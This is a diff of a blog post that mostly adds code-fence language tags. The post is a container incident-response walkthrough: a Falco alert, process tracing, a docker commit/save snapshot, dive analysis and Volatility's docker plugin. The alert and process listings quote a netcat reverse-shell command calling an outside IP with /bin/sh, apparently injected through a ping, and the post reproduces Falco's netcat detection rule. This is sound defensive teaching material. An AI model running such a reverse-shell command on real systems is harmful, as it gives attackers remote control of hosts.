@@ -14,20 +14,20 @@ Before we get into the actual analysis lets start with a quick overview of how p
 
 Take for example the following line from a `ps aux` output ran on a host.
 
-```
+```bash
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root        2954  0.0  0.0   4200   740 pts/1    S+   02:41   0:00 ping 8.8.8.8
 ```
 
 We can see this process has a PID of 2954. Looking at pstree we can see this process is a child of bash, which is a child of containerd-shim
 
-```
+```bash
 systemd(1)───containerd-shim(2396)───bash(2604)───ping(2954)
 ```
 
 If we exec into the container and run the same ps commands we get a completely different pid:
 
-```
+```bash
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root         379  0.0  0.0   4200   740 pts/1    S+   02:41   0:00 ping 8.8.8.8
 ```
@@ -40,7 +40,7 @@ For a much more indepth explaination I highly reccommend the book [Container Sec
 ### The Scene
 Moving on to a more practical example let's pretend that we get an alert from a Falco agent running on a host. In fact several alerts are generated for this behavior, but for our purposes just the one will be enough to kick of this investigation. Falco is a great tool and free to use. The fact that it is container aware makes it a great tool when looking to detect suspicious and malicious behavior in a container environment. The alert which was generated is below:
 
-```
+```json
 {
   "output": "21:39:47.159547041: Warning Netcat runs inside container that allows remote code execution (user=www-data user_loginuid=-1 command=nc 172.31.93.20 9876 -e /bin/sh container_id=60795d68fdee container_name=eloquent_babbage image=webapp:v1.0)",
   "priority": "Warning",
@@ -67,7 +67,7 @@ Moving on to a more practical example let's pretend that we get an alert from a 
 
 The rule name is `Netcat Remote Code Execution in Container` (ruh roh). In the output fields section we can see all kinds of useful information such as data about the image, the running container name, the command line associated with the alert, and the user that ran the command. Looking at the [rule](https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml#L2462) syntax it is a fairly simple rule.
 
-```
+```bash
  spawned_process and container and
     ((proc.name = "nc" and (proc.args contains "-e" or proc.args contains "-c")) or
      (proc.name = "ncat" and (proc.args contains "--sh-exec" or proc.args contains "--exec" or proc.args contains "-e "
@@ -76,7 +76,7 @@ The rule name is `Netcat Remote Code Execution in Container` (ruh roh). In the o
 ```
 
 The output for the rule is:
-```
+```bash
 output: >
     Netcat runs inside container that allows remote code execution (user=%user.name user_loginuid=%user.loginuid
     command=%proc.cmdline container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag)
@@ -88,14 +88,14 @@ Comparing the rule to the process cmdline included in the output_fields we can s
 
 On the host when we run `ps aux` we see an output similar to the one below. 
 
-```
+```bash
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 www-data   12520  0.0  0.0   4296   796 ?        S    21:53   0:00 sh -c ping  -c 4 & nc 172.31.93.20 9876 -e /bin/sh
 ```
 
 Digging deeper if we run `pstree -asp 12520` we see that the nc process is a child of apache2. 
 
-```
+```bash
 pstree -asp 12520
 
 systemd,1
@@ -119,21 +119,21 @@ First lets grab the eqivilant of a disk image of the running container this. We'
 
 Lets determine the container id where this process lives. We can do this by looking at the `-id` parameter associated with the containerd-shim process from the pstree command. If multiple containers exist we would need to trace the tree up to the relevant container-shim process. Additionally in our scenario Falco provided the container id in the alert for us. If we want we can run the `docker ps` command to validate the container is still running.
 
-```
-# docker ps
+```bash
+docker ps
 CONTAINER ID   IMAGE                  COMMAND      CREATED       STATUS       PORTS                               NAMES
 60795d68fdee   webapp:v1.0   "/main.sh"   3 hours ago   Up 3 hours   0.0.0.0:80->80/tcp, :::80->80/tcp   eloquent_babbage
 ```
 
 Now that we know the container ID we can create an image from the running container preserving any changes that have occured since the container was launched. The commit command below tells docker to create a new image name `sec-incident`, tag it with `123`, and use the running container id `6079` to build the image. Effectivly taking a snapshot of the container as it currently exists. 
 
-```
+```bash
 docker commit 6079 sec-incident:123
 ```
 
 When we run the `docker images` command we see our new image, as well as the orignal image the container launched with. 
 
-```
+```bash
 REPOSITORY             TAG       IMAGE ID       CREATED          SIZE
 sec-incident           123       9f64c8bead0e   21 seconds ago   845MB
 webapp                 v1.0      7adda9b17363   3 hours ago      714MB
@@ -141,7 +141,7 @@ webapp                 v1.0      7adda9b17363   3 hours ago      714MB
 
 Comparing the sizes of the two images there have been lots of changes within the image since it was first launched. Next we will `save` the image to disk so it is portable and can be moved to our analysis workstation.
 
-```
+```bash
 docker save sec-incident:123 -o sec-incident.tar
 ```
 
@@ -149,7 +149,7 @@ It is important to note we are using the `docker save` command specifying the im
 
 Once on our analyst workstation we need to perform a `docker load` on the tar file produced from the `docker save` command above. This will trigger the following output:
 
-```
+```bash
 docker load < sec-incident.tar
 a75caa09eb1f: Loading layer [==================================================>]    105MB/105MB
 80f9a8427b18: Loading layer [==================================================>]  494.7MB/494.7MB
@@ -172,7 +172,7 @@ Before progressing any further lets take a step back and talk about what an imag
 
 In our example when we extract the sec-incident.tar file we see an out put that contains a layer folder, inside of that folder is a VERSION, json, and layer.tar file. Additionally at the root level of the image there is `manifest.json`, `repositories`, and a `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` file. The `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` file uses the hash of the image. The image hash is a sha256sum of this config file. 
 
-```
+```bash
 tar -xvf sec-incident.tar
 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/
 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/VERSION
@@ -225,7 +225,7 @@ repositories
 
 The `manifest.json` file shows us information about the layers in the image as well as the repo/tags associated with the image
 
-```
+```json
 [
   {
     "Config": "9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json",
@@ -251,13 +251,13 @@ The `manifest.json` file shows us information about the layers in the image as w
 
 The `repositories` file is just meta-data about the image:
 
-```
+```json
 {"sec-incident":{"123":"6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2"}}
 ```
 
 When we look at the `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` config file we can see all of the layers and what command(s) were used to create the layer. Below is a snip from the file:
 
-```
+```json
     {
       "created": "2018-10-12T17:49:01.240444043Z",
       "created_by": "/bin/sh -c #(nop)  ENTRYPOINT [\"/main.sh\"]",
@@ -284,7 +284,7 @@ There are several tools that can be used to perform static analysis of a contain
 
 Once installed on our analysis system we can run the tool with:
 
-```
+```bash
 dive sec-incident:123
 ```
 
@@ -358,7 +358,7 @@ In the table above we can see `main.sh` is a child of containerd-shim which indi
 
 The docker plugin itself adds several new capabilities. The output below shows the available arguments: 
 
-```
+```bash
 python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.docker.Docker -h
 
 optional arguments:
@@ -376,7 +376,7 @@ optional arguments:
 ```
 
 The `--detector` argument attempts to detect if docker is being used on the system. This can be helpful if you are not sure if docker is being used on the system.
-```
+```bash
 python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --detector
 Volatility 3 Framework 2.1.0
 Progress:  100.00               Stacking attempts finished
@@ -386,7 +386,7 @@ True    True    True    True
 ```
 
 `--ps` and `--ps-extended` emulates the `docker ps` command showing all containers within the dump and details about them.
-```
+```bash
 python3 /home/ubuntu/git/volatility3/vol.py  -f /home/ubuntu/webserver.lime docker.Docker --ps
 Volatility 3 Framework 2.1.0
 Progress:  100.00               Stacking attempts finished
@@ -405,7 +405,7 @@ Creation time (UTC)     Command Container ID    Is privileged   PID     Effectiv
 ```
 
 To see the capabilities associated with a container the `--inspect-caps` argument can be used. Having an understanding of a containers capabilities can help shed light on what possible damage it could cause to the underlying system or neighboring containers. This will generate an output similar to below:
-```
+```bash
 python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-caps
 Volatility 3 Framework 2.1.0
 Progress:  100.00               Stacking attempts finished
@@ -415,7 +415,7 @@ PID     Container ID    Effective Capabilities Mask     Effective Capabilities M
 ```
 
 The `--inspect-networks` argument will show the containers and the associated networks. If more than one container is in the same network the truncated container id's are comma seperated.
-```
+```bash
 python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-networks
 Volatility 3 Framework 2.1.0
 Progress:  100.00               Stacking attempts finished
